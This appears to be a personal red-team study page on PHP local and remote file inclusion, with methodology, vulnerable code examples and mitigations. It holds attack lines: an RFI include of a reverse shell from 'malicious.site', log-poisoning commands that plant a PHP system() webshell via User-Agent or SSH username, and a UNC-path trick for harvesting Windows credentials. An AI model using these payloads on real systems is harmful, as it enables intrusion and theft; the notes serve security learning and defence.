# File inclusion

[![fileinc](../../../../_badges/thmp/fileinc.svg)](https://tryhackme.com/room/fileinc)
[![fileinclusion](../../../../../cybersecurity/_badges/htb/fileinclusion.svg)](https://academy.hackthebox.com/course/preview/file-inclusion)

<div class="row row-cols-lg-2"><div>

A web application might import/include files based on data from the user. This involves using the user input to:

* ğŸš determine configuration files to include
* ğŸŒ determine language files to include
* ...

If the user input isn't properly sanitized, the user may be able to control which files are included, which may allow them:

* ğŸ—ºï¸ To read local or remote files
* ğŸ“š To leverage a [SSRF](ssrf.md) attack <small>(port mapping, steal files, etc.)</small>
* ğŸ² To execute code <small>(either uploaded code, remote code, or using logs)</small>

Code/data exposure may further compromise the infrastructure.
</div><div>

There are two categories of file inclusion:

* **Local File Inclusion (LFI)** ğŸ : include a local file
* **Remote File Inclusion (RFI)** âœˆï¸: include a remote file

<br>

Additional notes:

* ğŸ¤– Not all include functions can execute code
* ğŸ“Œ Template engines are more likely to contain LFI/RFI.
* ğŸ² While LFI/RFI often involve HTTP, we can also use `ftp://`
* ğŸ”‘ Try `\\YOURIP\share\` RFI on Windows to [harvest credentials](/cybersecurity/red-team/_knowledge/topics/request_grabber.md)
* ğŸ˜ For RFI, try a local URLs first <small>(ex: `http://127.0.0.1:80/index.php`)</small>, as remote URLs may be blocked by a firewall
</div></div>

<hr class="sep-both">

## Basic Methodology

[![fileinc](../../../../_badges/thmp/fileinc.svg)](https://tryhackme.com/room/fileinc)
[![fileinclusion](../../../../../cybersecurity/_badges/htb/fileinclusion.svg)](https://academy.hackthebox.com/course/preview/file-inclusion)

<div class="row row-cols-lg-2"><div>

Assuming you found some vectors that might lead to a LFI/RFI:

* ğŸ“š Headers
* ğŸ“„ Forms
* ğŸª Cookies
* ...

You might try to play around with the value to see if it works.
</div><div>

Assuming we have `page=about`.

* Test Path: `./about`
* Test Null-Byte: `./about.php%00`
* Test [Path Traversal](traversal.md): `../<folder name>/about`
* Test engine-specific payloads, such as `php://filter`
* Test Remote File Inclusion
* ...

For a list of interesting files to read, aside from the website source code and configuration files, refer to [arbitrary file read](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/arbitrary_file_access.md).
</div></div>

<hr class="sep-both">

## PHP File Inclusion

[![fileinc](../../../../_badges/thmp/fileinc.svg)](https://tryhackme.com/room/fileinc)
[![fileinclusion](../../../../../cybersecurity/_badges/htb/fileinclusion.svg)](https://academy.hackthebox.com/course/preview/file-inclusion)
[![directory_traversal](../../../../_badges/rootme/web_server/directory_traversal.svg)](https://www.root-me.org/en/Challenges/Web-Server/Directory-traversal)
[![local_file_inclusion](../../../../_badges/rootme/web_server/local_file_inclusion.svg)](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion)
[![php_filters](../../../../_badges/rootme/web_server/php_filters.svg)](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)
[![php_assert](../../../../_badges/rootme/web_server/php_assert.svg)](https://www.root-me.org/en/Challenges/Web-Server/PHP-assert)
[![remote_file_inclusion](../../../../_badges/rootme/web_server/remote_file_inclusion.svg)](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)
[![xslt_code_execution](../../../../_badges/rootme/web_server/xslt_code_execution.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSLT-Code-execution)
[![local_file_inclusion_wrappers](../../../../_badges/rootme/web_server/local_file_inclusion_wrappers.svg)](https://www.root-me.org/fr/Challenges/Web-Serveur/Local-File-Inclusion-Wrappers)
[![pyrat_auction](../../../../_badges/rootme/realist/pyrat_auction.svg)](https://www.root-me.org/en/Challenges/Realist/PyRat-Auction-83)
[![local_file_inclusion_double_encoding](../../../../_badges/rootme/web_server/local_file_inclusion_double_encoding.svg)](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)

<div class="row row-cols-lg-2"><div>

The URL `http://example.com/?lang=fr` associated with the code below is an example of a vulnerable PHP code.

```php!
include "lang/$_GET[lang].php" // It loads lang/fr.php
```

ğŸ’¥ PHP `include`/`require` function executes PHP code.

âš”ï¸ We can use [Path traversal](traversal.md) or [PHP Wrappers](files/wrappers.md) to include a malicious file, such as one we uploaded using another attack or execute code.
</div><div>

**Local File Inclusion (LFI)** ğŸ : inject a local file

```php!
// ex: we uploaded a reverse shell (a fake PNG)
// as our avatar (avatar.png), then we could use:
include "lang/../uploads/avatar.png";
include "phar://<refer to php wrappers>";
```

**Remote File Inclusion (RFI)** âœˆï¸: inject a remote file

```php!
// ğŸ›‘ allow_url_fopen MUST BE SET TO true
include "http://malicious.site/reverse_shell.php";
include "data://<refer to php wrappers>";
```
</div></div>

<hr class="sep-both">

## Log Poisoning

[![fileinclusion](../../../../../cybersecurity/_badges/htb/fileinclusion.svg)](https://academy.hackthebox.com/course/preview/file-inclusion)

<div class="row row-cols-lg-2"><div>

If the vulnerable function can execute code, we may not have to upload a webshell, we can inject PHP code in the logs and read the logs to execute the injected code.

Note that logs must be readable by the web application. Nginx logs are readable by anyone, but not Apache logs.

```ps
# Ex: load /var/log/apache2/access.log / ...
$ curl [...] -A "<?php system(\$_GET['cmd']); ?>"
```

ğŸ‘‰ `/proc/self/environ` or `/proc/self/fd/<0-50>` will contains the User-Agent too, but they may not be readable either.
</div><div>

We can alternatively poison ssh logs <small>(username)</small>, ftp logs, etc.

```ps
$ ssh '<?php /*code*/ ?>'@IP # Ex: /var/log/auth.log
```

#### PHP Sessions

If the session contains a value that we control, we can inject PHP code in this value, then we can read the session file.

* `/var/lib/php/sessions/sess_<session id>`
* `C:\Windows\Temp\sess_<session id>`
</div></div>

<hr class="sep-both">

## File Inclusion Filter By-Pass

Refer to [Path Traversal Bypass filters](traversal.md#path-traversal-bypass-filters).

<hr class="sep-both">

## File Inclusion Mitigation ğŸ›¡ï¸

[![fileinc](../../../../_badges/thmp/fileinc.svg)](https://tryhackme.com/room/fileinc)
[![fileinclusion](../../../../../cybersecurity/_badges/htb/fileinclusion.svg)](https://academy.hackthebox.com/course/preview/file-inclusion)

<div class="row row-cols-lg-2"><div>

* ğŸª² Do not use user-controlled input to include a file, whether the input is from the database or from a form.

* ğŸ«§ Use whitelists <small>(switch-case value to file, maps, etc.)</small>, and avoid directly using user-controlled input

* ğŸ•¸ï¸ If allowing paths, refer to path traversal mitigations
</div><div>

* ğŸ”’ Use docker or a similar technology to isolate the application OR lock web applications to their web root directory. In PHP, we can set the `open_basedir` variable in the PHP INI file. Beware that configuration files will still be accessible.

* ğŸ”« Use additional verifications such as using `realpath` in path to ensure the files are within the allowed directories

* ğŸ“š Use additional tools such as a WAF, etc.
</div></div>

<hr class="sep-both">

## ğŸ‘» To-do ğŸ‘»

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* Second Order Attack (poisoned database entry)
* `/var/log/sshd.log`
* `/var/log/vsftpd.log`
</div><div>

* [LFISuite](https://github.com/D35m0nd142/LFISuite) <small>(1.6k â­, 2018 ğŸª¦)</small>
* [LFiFreak](https://github.com/OsandaMalith/LFiFreak) <small>(0.2k â­, 2015 ğŸª¦)</small>
* [liffy](https://github.com/mzfr/liffy) <small>(0.7k â­)</small>
</div></div>